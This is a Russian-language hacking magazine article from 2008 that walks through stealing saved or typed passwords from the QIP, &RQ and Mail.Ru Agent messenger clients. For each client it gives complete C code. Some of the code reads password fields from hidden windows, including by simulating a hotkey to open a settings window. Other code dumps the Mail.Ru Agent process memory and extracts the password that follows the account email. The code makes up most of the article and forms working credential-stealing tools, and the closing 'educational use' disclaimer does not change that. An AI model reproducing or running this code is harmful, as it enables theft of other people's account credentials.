---
description: Журнал «Хакер» 06.02.2008
---

# Кража паролей из памяти

## Кража паролей из памяти

  
Меня порой поражает беспечность разработчиков программных продуктов. И данные шифруют, и алгоритмы новые придумывают, и программы свои от взлома защищают, но пользы большой это не приносит.  
Любой более-менее продвинутый пользователь знает, что хранить пароли на диске небезопасно. Самое надежное хранилище паролей - это голова. В то же время, большинство программ, требующих авторизации пользователя, предоставляют возможность сохранения \(запоминания\) пароля в программе для ускорения процесса входа в систему в дальнейшем. Разработчики реализуют эту функцию по разному - кто-то хранит пароль в файлах настроек, кто-то в реестре, кто-то в защищенном хранилище Windows \(тот же реестр, но доступный лишь пользователю System\). Вариантов хранения масса. Впрочем, как и методов кражи паролей из этих мест. Существует множество вредоносных программ, основной или дополнительной функцией  
которых является кража сохраненных паролей с жесткого диска жертвы.  
Мы, ведь с вами, продвинутые пользователи, правда? И поэтому, никогда не сохраняем пароли, а только запоминаем. Верно ли утверждение, что в этом случае наш пароль в безопасности? Давайте проверим.

### Что нам понадобится?

* Spy++ из пакета MS Visual Studio, или любая подобная утилита.
* PE Tools, или любая утилита, позволяющая сделать дамп процесса.
* Hex Workshop, или любой другой шестнадцатеричный редактор.
* MS Visual C++, или любой C компилятор.

### Что будем исследовать?

* QIP. У меня - билд 8040. \([qip.ru](http://www.qip.ru/)\)
* &RQ. Я использовал версию 0.9.7.4. \([andrq.org](http://www.andrq.org/)\)
* [Mail.Ru](http://mail.Ru) Агент. Версия 5.0, билд 2082. \([agent.mail.ru](http://agent.mail.ru/)\) 

### Взлом паролей QIP 

Бесплатный интернет-пейджер, написанный и поддерживаемый российским программистом. У QIP миллионы поклонников, которые любят его за удобство, кучу скинов и массу других полезных возможностей.  
Если у вас еще нет этого ICQ-клиента - вперед на сайт разработчика за последней версией. Устанавливаем, запускаем.  
Открывшееся окно предлагает нам ввести данные авторизации, либо завести новую учетную запись. Не важно, зарегистрируете ли вы новый аккаунт, или будете заходить со своими учетными данными. Двигаемся дальше.  
QIP любезно предоставляет нам возможность сохранить пароль. Пароль мы сохранять не будем. Пока оставляем QIP в покое и открываем Spy++. Жмем Alt+F3 и открываем диалог поиска окна. Берем мышкой Finder Tool и кидаем его на окно менеджера учетных записей QIP'а.  
  
Нажимаем Ok и Spy++ показывает нам в списке окон нужное нам окно - "QIP - Спокойное общение!", имя класса которого TManForm. На нем дерево дочерних окон, обеспечивающих интерфейс подключения к серверу. Нас интересуют TGroupBox, TComboBox на нем и TEdit. Это как раз наши UIN и пароль. Запомним название классов.  
Переходим снова в окно QIP и нажимаем кнопку "Подключиться".  
Диалог входа закрылся. Можно общаться. Но проверим, закрылось ли окно диалога? Обновим список окон в Spy++ \(клавиша F5\) и попробуем снова найти окно авторизации QIP. Нажимаем Alt+F3 и вводим параметры поиска. Для того чтобы найти окно нам надо указать хотя бы один параметр: Handle - уникальный идентификатор окна, Caption - надпись формы, Class - имя класса окна. Мы будем искать по классу.  
Вводим в поле Class класс окна TManForm. Жмем Ok.  
  
Что мы видим? Окно не закрылось. Оно просто невидимо... Попробуем прочитать поля с данными авторизации. Для этого используем стандартный механизм общения окон и системы в Windows - сообщения.

  
**Начинаем программировать.**

```text
void main()
{
// Объявим переменные, необходимые для работы
HWND hManForm,hGroupBox,hEdit,hComboBox; // Идентификаторы форм
char* pUIN; // Указатель на буфер для UIN
char* pPass; // Указатель на буфер для пароля
int iUIN; // Длина UIN
int iPass; // Длина пароля
// Найдем окно диалога авторизации
hManForm=FindWindow("TManForm",0);
// Расположенная на нем группа элементов управления
hGroupBox=FindWindowEx(hManForm,0,"TGroupBox",0);
// Список с UIN'ами
hComboBox=FindWindowEx(hGroupBox,0,"TComboBox",0);
// Получим длину текста в списке
iUIN=SendMessage(hComboBox, WM_GETTEXTLENGTH, 0, 0)+1;
// Выделяем необходимую память для буфера
pUIN=(char*)LocalAlloc(0, iUIN);
// Получим непосредственно текст
SendMessage(hComboBox, WM_GETTEXT, iUIN, (long)pUIN);
// Поле с паролем
hEdit=FindWindowEx(hGroupBox,0,"TEdit",0);
// Дальше все по аналогии с UIN'ом
iPass=SendMessage(hEdit, WM_GETTEXTLENGTH, 0, 0)+1;
pPass=(char*)LocalAlloc(0, iPass);
SendMessage(hEdit, WM_GETTEXT, iPass, (long)pPass);
//Выведем что получилось
cout << "[!!!]Found for: "<< pUIN << "\tPassword: " << pPass;
// Освободим память
LocalFree(pUIN);
LocalFree(pPass);
}
```

Сохраняем, компилируем, запускаем. Что у нас получилось? Если все сделано верно, то программа вернет строку, содержащую ваш UIN и пароль.  
Следует заметить, что если мы запустим QIP, в котором предварительно была установлена опция "Сохранить пароль", то данный метод получения пароля работать не будет, так как в поле пароля находится текст "&lt;:HIDDEN:&gt;". Видимо, разработчик, краем уха все-таки слышал про безопасность.

### Взлом паролей &RQ 

Так же бесплатный и не менее популярный, чем QIP, ICQ-клиент, который ласково называют "крысой". Крыса поддерживает плагины, скины и поддерживается сообществом разработчиков.  
Качаем последнюю стабильную версию с офсайта и начинаем исследование.  
После запуска &RQ предлагает нам создать новый профиль, для чего надо указать свой UIN, либо зарегистрировать новый. Далее предлагается выбрать язык интерфейса и программа благополучно стартует. Для того, чтобы крыса подключилась к серверу, надо выбрать статус "Онлайн". Программа запрашивает пароль и подключается. Можно указать программе что надо подключаться автоматически при старте, для этого надо в настройках \(Alt+P\) поставить опцию "Соединяться при запуске" на фрейме "Запуск". Это не обязательно. Для нас же важна опция "Не сохранять пароль", в категории "Безопасность" настроек. Выставляем ее.  
Переходим на фрейм "Соединение". Чем примечательна для нас данная категория? Тем, что здесь есть поле "Пароль". Запомним это обстоятельство. Пока же закроем крысу.  
Откроем ее заново. Для подключения нам надо указать пароль, ведь мы выставили опцию "Не сохранят пароль". Введем пароль, подключимся. Снова вызовем диалог настроек. Удивительно, но поле "Пароль" содержит текст. Это наш пароль? Проверим.  
Воспользовавшись утилитой Spy++, узнаем имена классов окон &RQ, и начнем писать код.

```text
void main()
{
// Объявим переменные, необходимые для работы
HWND hmainFrm,hprefFrm,hPanel,hconnectionFr,hEdit; // Идентификаторы форм
char* pUIN; // Указатель на буфер для UIN
char* pPass; // Указатель на буфер для пароля
int iUIN; // Длина UIN
int iPass; // Длина пароля
// Основное окно &RQ. Из него мы будем получать UIN
hmainFrm=FindWindow("TmainFrm",0);
// Длина текста
iUIN=SendMessage(hmainFrm, WM_GETTEXTLENGTH, 0, 0)+1;
// Выделяем буфер
pUIN=(char*)LocalAlloc(0,iUIN);
// Получаем заголовок основного окна - это UIN
GetWindowText(hmainFrm,pUIN,iUIN);
/*
```

Следует учитывать, что при запуске &RQ, окно настроек  
не открывается вместе с основным окном. Но что же нам  
мешает его открыть? Тем более что нам любезно предоставлена  
возможность использовать горячие клавиши \(Alt+P\). Вот  
и эмулируем их нажатие.

```text
*/
// Эмуляция Alt+P - горячей клавиши для вызова окна "Настройки"
SendMessage(hmainFrm, WM_SYSKEYDOWN, 'P', 0x20000000);
SendMessage(hmainFrm, WM_SYSKEYUP, 'P', 0x20000000);
// Находим окно настроек
hprefFrm=FindWindow("TprefFrm",0);
// Панель с категориями настроек
hPanel=FindWindowEx(hprefFrm,0,"TPanel",0);
// Фрейм с настройками подключения
hconnectionFr=FindWindowEx(hPanel,0,"TconnectionFr",0);
// Поле с паролем
hEdit=FindWindowEx(hconnectionFr,0,"TEdit",0);
// Длина пароля
iPass=SendMessage(hEdit, WM_GETTEXTLENGTH, 0, 0)+1;
// Выделаем буфер
pPass=(char*)LocalAlloc(0,iPass);
// Получаем пароль
SendMessage(hEdit, WM_GETTEXT, iPass, (long)pPass);
// Выводим результат
cout << "[!!!]Found for: "<< pUIN << "\tPassword: " << pPass;
// Освободим память
LocalFree(pUIN);
LocalFree(pPass);
}
```

После выполнения программы можно убедиться, что и данный пример работает. Мы получили наш пароль. При этом, если QIP в случае сохранения пароля на диске скрывает пароль, то &RQ не заботится о том, как был введен пароль. В окне настроек пароль можно обнаружить всегда.  
Единственный нюанс заключается в том, что &RQ не открывает окно настроек после старта, хотя единожды открытое окно настроек после закрытия опять же не закрывается, а просто становится невидимым. В исходном коде мы использовали горячую клавишу, чтобы быть уверенными, что окно настроек открыто.

### Взлом паролей [Mail.Ru](http://mail.Ru) Агент

Очередное средство общения в сети, предоставляемое компанией [Mail.Ru](http://mail.Ru). Работает по собственному протоколу, имеет возможность голосового общения с выходом на внешние телефонные номера. Имеет кучу возможностей и соответственно, поклонников, которые пользуются им ежедневно.  
В случае с [Mail.ru](http://mail.ru) Агентом мы будем использовать другой подход. Чуть более сложный, но не менее эффективный. Окна искать мы не будем. Попробуем найти пароль в памяти процесса.  
Итак, качаем, устанавливаем, регистрируемся если надо и запускаем.  
Агент поддерживает несколько аккаунтов пользователей, и список их хранит в реестре. В ветке 

```text
HKEY_CURRENT_USER\Software\ Mail.Ru\Agent\magent_logins
```

 он создает столько REG\_BINARY параметров, сколько аккаунтов зарегистрировано на локальном компьютере. Ключи при этом называются следующим образом: NNN\#ваш\_email\_адрес, где NNN - порядковый номер аккаунта.  
Посмотрим, есть ли в памяти процесса email-адрес. Для этого воспользуемся утилитой PE Tools, которая позволяет сделать дамп процесса.  
Сохраняем дамп, загружаем его в Hex Workshop. Жмем Ctrl+F для открытия диалога поиска. Выбираем режим Text String и в поле Value вводим наш email-адрес. Нажимаем Ok и редактор выделяет найденный текст. Вы уже заметили? Через 4 байта от email-адреса находится пароль! Что это за 4 байта? Это 32-х битное значение длины пароля. Перед email-адресом тоже есть его длина. Вот и все, осталось только автоматизировать процесс поиска, чем мы и займемся.

```text
// Функция возвращает хэндл процесса magent.exe
HANDLE GetProcess()
{
HANDLE hProcessSnap; // Хэндл снимка процессов
PROCESSENTRY32 pe32; // Структура, содержащая информацию о процессе
// Делаем снимок процессов
hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
if(hProcessSnap == INVALID_HANDLE_VALUE) return 0;
pe32.dwSize = sizeof(PROCESSENTRY32);
// Перебираем снимок
if(!Process32First(hProcessSnap,&pe32)) {CloseHandle(hProcessSnap);return 0;}
do
{
// Сравниваем имя файла с magent.exe
if(!lstrcmp(strupr("magent.exe"),strupr(&pe32.szExeFile[0])))
{
// Нашли нужный процесс, вернем его хэндл
return OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
}
} while( Process32Next(hProcessSnap,&pe32));
// Закрываем снимок процессов
CloseHandle( hProcessSnap );
return 0;
}
void main()
{
HKEY hKey; // Идентификатор ключа реестра
DWORD i,t, retCode, cValues = 256; // Необходимые промежуточные переменные
char regValue[MAX_PATH]; // Буфер для чтения ключа реестра
DWORD cchValue = 1024; // Размер буфера
HANDLE hProcess; // Хэндл процесса
char szEmail[MAX_PATH]; // Буфер для email-адреса
int iEmail; // Длина email-адреса
HMODULE hModule; // Хэндл модуля
MODULEINFO modinfo; // Структура, содержащая информацию о модуле
DWORD dwReaded; // Количество байт в дампе процесса
char szPass[128]; // Буфер для пароля
bool found; // Флаг найден/не найден пароль
char* pTmp; // Временный буфер
hProcess=GetProcess();
if (hProcess)
{
// Получаем хэндл модуля по хэндлу процесса,
// для чего временно создаем новый поток
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
(LPTHREAD_START_ROUTINE)GetModuleHandle, NULL, 0, NULL);
WaitForSingleObject(hThread, INFINITE);
GetExitCodeThread(hThread, (LPDWORD)&hModule);
CloseHandle(hThread);
// Получаем информацию о загруженном модуле
GetModuleInformation(hProcess,hModule,&modinfo,sizeof(MODULEINFO));
// Буфер для дампа
PBYTE pBuffer = new BYTE[modinfo.SizeOfImage];
// Читаем дамп
ReadProcessMemory(hProcess, modinfo.lpBaseOfDll, pBuffer,
modinfo.SizeOfImage, &dwReaded);
if (dwReaded>0)
{
// Открываем ключ реестра
if (RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Mail.Ru\\Agent
\\magent_logins",0,KEY_QUERY_VALUE,&hKey)==ERROR_SUCCESS)
{
for (t = 0, retCode = ERROR_SUCCESS; t < cValues; t++)
{
// Перебираем по очереди параметры ключа реестра для поиска email'ов в дампе
retCode = RegEnumValue(hKey, t, regValue, &cchValue, NULL, NULL, NULL, NULL);
if (retCode == ERROR_SUCCESS)
{
// Первые 4 байта имени параметра это номер, его пропускаем. Далее идет адрес.
lstrcpy(szEmail,(const char*)®Value[4]);
iEmail=lstrlen(szEmail);
// Выделяем буфер, в который будем заносить сравниваемые участки дампа
pTmp=(char*)LocalAlloc(0,iEmail);
found=FALSE;
// Двигаемся по дампу
for (i=0;i<dwReaded;i++)
{
if (found){i=dwReaded;} //Заканчиваем перебор
// Берем очередной участок дампа для сравнения
memcpy(&pTmp,&pBuffer[i],iEmail);
// Сравниваем
if (!memcmp(&pTmp,szEmail,iEmail))
{
// Через 4 байта после адреса находится пароль.
memcpy(szPass,&pBuffer[i+iEmail+4],sizeof(szPass));
// Пароль найден. Выводим результат.
cout << "[!!!]Found for : " << szEmail << "\tPassword: " << szPass;
found=TRUE;
}
}
LocalFree(pTmp);
}
}
RegCloseKey(hKey);
}
}
}
}
```

Компилируем, запускаем, получаем пароль. Все просто.

### Заключение

Какой можно сделать вывод? Даже если мы не храним конфиденциальную информацию на жестком диске, она является уязвимой. Всегда можно найти кучу способов получить закрытую информацию, а многие из этих способов будут настолько просты и неожиданны, что их может обнаружить каждый. Надо лишь мыслить нестандартно и все у вас получится.  
Все вышеприведенные примеры направлены на привлечение более пристального внимания разработчиков программ к проблеме информационной безопасности. Приведенный автором код не претендует на уникальность и универсальность, тем не менее, принцип получения информации, применим ко многим программным продуктам.  
Код примеров можно модифицировать, но использовать настоятельно рекомендуется только в образовательных целях.  

